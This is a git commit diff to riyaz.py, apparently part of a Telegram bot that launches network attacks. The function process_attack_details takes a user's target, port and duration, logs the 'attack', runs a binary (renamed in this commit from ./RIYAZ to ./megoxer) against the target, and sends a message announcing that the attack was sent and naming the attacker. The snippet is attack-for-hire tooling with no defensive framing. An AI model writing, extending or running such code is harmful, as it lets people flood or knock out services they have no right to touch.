35ab64e90c26c8cd4c76d73266ff6e882f2013ea
Riyaz-89 <riyazkhan61911+ezggx@gmail.com>
2025-01-23 13:46:36 +0530

    Update riyaz.py

--- riyaz.py
+++ riyaz.py
@@ -324,7 +324,7 @@ def process_attack_details(message):
                 # Record and log the attack
                 record_command_logs(user_id, 'attack', target, port, time)
                 log_command(user_id, target, port, time)
-                full_command = f"./RIYAZ {target} {port} {time}"
+                full_command = f"./megoxer {target} {port} {time}"
                 username = message.chat.username or "No username"
                 # Send immediate response that the attack is being executed
                 response = f"🚀 𝗔𝘁𝘁𝗮𝗰𝗸 𝗦𝗲𝗻𝘁 𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆! 🚀\n\n𝗧𝗮𝗿𝗴𝗲𝘁: {target}:{port}\n𝗧𝗶𝗺𝗲: {time} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀\n𝗔𝘁𝘁𝗮𝗰𝗸𝗲𝗿: @{username}"
